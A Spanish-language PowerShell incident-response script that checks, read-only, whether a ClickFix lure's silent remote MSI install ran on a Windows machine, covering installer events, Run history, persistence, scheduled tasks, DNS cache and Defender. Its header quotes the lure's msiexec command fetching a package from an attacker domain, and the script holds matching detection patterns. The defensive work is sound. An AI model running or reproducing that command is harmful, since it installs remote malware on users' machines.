# =============================================================================
# Revision de un equipo Windows tras un intento de ClickFix
#
# Contexto: el sitio vallesol.pe sirvio una falsa verificacion de Cloudflare que
# copiaba al portapapeles este comando y pedia pegarlo en Ejecutar:
#
#   msiexec /package http://murielle22.com/dpo33feev1u19h /Q S1="..."
#
# Ese comando instala un MSI remoto en silencio. Este script NO lo ejecuta ni lo
# deshace: solo mira y reporta, para responder una pregunta concreta, que es si
# llego a ejecutarse. Todo lo que hace es de lectura.
#
# Uso, en PowerShell como administrador:
#     .\revisar_equipo.ps1
#
# Deja el resultado en revision_equipo.txt, en esta misma carpeta.
# =============================================================================

$ErrorActionPreference = "Continue"
$salida = Join-Path (Split-Path -Parent $MyInvocation.MyCommand.Path) "revision_equipo.txt"
$desde = (Get-Date).AddDays(-14)

function Seccion($titulo) {
    $linea = "`n" + ("=" * 78) + "`n$titulo`n" + ("=" * 78)
    Write-Host $linea -ForegroundColor Cyan
    $linea | Out-File -Append -Encoding utf8 $salida
}

function Anotar($texto) {
    $texto | Out-File -Append -Encoding utf8 $salida
    Write-Host $texto
}

"Revision de equipo - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $env:COMPUTERNAME\$env:USERNAME" |
    Out-File -Encoding utf8 $salida

# --- 1. La pregunta principal -------------------------------------------------
# Windows Installer deja rastro de toda instalacion en el registro de eventos,
# incluso de las silenciosas. Si el MSI corrio, aparece aqui.
Seccion "1. Instalaciones de Windows Installer en los ultimos 14 dias"
try {
    $eventos = Get-WinEvent -FilterHashtable @{
        LogName = 'Application'
        ProviderName = 'MsiInstaller'
        StartTime = $desde
    } -ErrorAction Stop
    if ($eventos) {
        $eventos | Select-Object TimeCreated, Id, @{n='Mensaje';e={($_.Message -split "`n")[0]}} |
            Format-Table -AutoSize | Out-String -Width 200 | ForEach-Object { Anotar $_ }
    } else {
        Anotar "Sin eventos de MsiInstaller. Buena senal."
    }
} catch {
    Anotar "Sin eventos de MsiInstaller en el periodo. Buena senal."
}

# --- 2. El rastro del comando -------------------------------------------------
Seccion "2. Rastro del comando en el historial de Ejecutar"
$clave = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
if (Test-Path $clave) {
    $entradas = Get-ItemProperty $clave
    $entradas.PSObject.Properties |
        Where-Object { $_.Name -match '^[a-z]$' } |
        ForEach-Object { Anotar ("  " + $_.Name + " = " + $_.Value) }
    $sospechoso = $entradas.PSObject.Properties |
        Where-Object { $_.Value -match 'msiexec|murielle|package' }
    if ($sospechoso) {
        Anotar "`n  >>> El comando SI llego a la caja de Ejecutar."
        Anotar "  >>> Que este aqui significa que se escribio, no necesariamente que se ejecuto."
        Anotar "  >>> La seccion 1 es la que dice si corrio."
    }
} else {
    Anotar "No hay historial de Ejecutar."
}

# --- 3. Lo que un MSI dejaria atras ------------------------------------------
Seccion "3. Programas instalados en los ultimos 14 dias"
$rutas = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*",
    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"
)
$programas = Get-ItemProperty $rutas -ErrorAction SilentlyContinue |
    Where-Object { $_.InstallDate -and
                   ([datetime]::ParseExact($_.InstallDate,'yyyyMMdd',$null) -ge $desde) } |
    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
if ($programas) {
    $programas | Format-Table -AutoSize | Out-String -Width 200 | ForEach-Object { Anotar $_ }
} else {
    Anotar "Ninguno instalado en el periodo."
}

Seccion "4. Archivos MSI y ejecutables recientes en carpetas temporales"
foreach ($carpeta in @($env:TEMP, "$env:WINDIR\Temp", "$env:APPDATA", "$env:LOCALAPPDATA")) {
    $encontrados = Get-ChildItem $carpeta -Include *.msi,*.exe,*.dll,*.ps1,*.bat,*.js `
        -Recurse -File -ErrorAction SilentlyContinue |
        Where-Object { $_.LastWriteTime -ge $desde } |
        Select-Object -First 30 FullName, Length, LastWriteTime
    Anotar "`n  -- $carpeta"
    if ($encontrados) {
        $encontrados | Format-Table -AutoSize | Out-String -Width 200 | ForEach-Object { Anotar $_ }
    } else {
        Anotar "     sin novedades"
    }
}

# --- 5. Como se mantendria un intruso ----------------------------------------
Seccion "5. Persistencia: claves Run y carpetas de inicio"
foreach ($k in @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce")) {
    Anotar "`n  -- $k"
    if (Test-Path $k) {
        (Get-ItemProperty $k).PSObject.Properties |
            Where-Object { $_.Name -notmatch '^PS' } |
            ForEach-Object { Anotar ("     " + $_.Name + " = " + $_.Value) }
    }
}
Anotar "`n  -- Carpeta de inicio"
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" -ErrorAction SilentlyContinue |
    ForEach-Object { Anotar ("     " + $_.Name + "  " + $_.LastWriteTime) }

Seccion "6. Tareas programadas creadas en los ultimos 14 dias"
$tareas = Get-ScheduledTask -ErrorAction SilentlyContinue | ForEach-Object {
    $info = $_ | Get-ScheduledTaskInfo -ErrorAction SilentlyContinue
    if ($info -and $info.LastRunTime -ge $desde -and $_.Date -and
        ([datetime]$_.Date) -ge $desde) {
        [pscustomobject]@{
            Nombre = $_.TaskName; Ruta = $_.TaskPath
            Creada = $_.Date
            Accion = ($_.Actions | ForEach-Object { $_.Execute }) -join '; '
        }
    }
}
if ($tareas) {
    $tareas | Format-Table -AutoSize | Out-String -Width 200 | ForEach-Object { Anotar $_ }
} else {
    Anotar "Ninguna creada en el periodo."
}

# --- 7. Contacto con los dominios del ataque ---------------------------------
Seccion "7. Rastro de los dominios del ataque en la cache DNS"
$dominios = @('murielle22', 'trackerredirect', 'campaigntracker')
$cache = ipconfig /displaydns 2>$null | Out-String
foreach ($d in $dominios) {
    if ($cache -match $d) {
        Anotar "  >>> $d APARECE en la cache DNS de este equipo"
    } else {
        Anotar "      $d no aparece"
    }
}

Seccion "8. Estado del antivirus"
try {
    Get-MpComputerStatus | Select-Object AMServiceEnabled, RealTimeProtectionEnabled,
        AntivirusSignatureLastUpdated, QuickScanEndTime |
        Format-List | Out-String | ForEach-Object { Anotar $_ }
    $amenazas = Get-MpThreatDetection -ErrorAction SilentlyContinue |
        Where-Object { $_.InitialDetectionTime -ge $desde }
    if ($amenazas) {
        Anotar ">>> Defender detecto amenazas en el periodo:"
        $amenazas | Select-Object InitialDetectionTime, ThreatID, Resources |
            Format-Table -AutoSize | Out-String -Width 200 | ForEach-Object { Anotar $_ }
    } else {
        Anotar "Defender no registro detecciones en el periodo."
    }
} catch {
    Anotar "No se pudo consultar Defender: $_"
}

Write-Host "`nListo. El detalle quedo en:" -ForegroundColor Green
Write-Host "  $salida"
Write-Host "La seccion 1 es la que contesta si el instalador llego a correr."
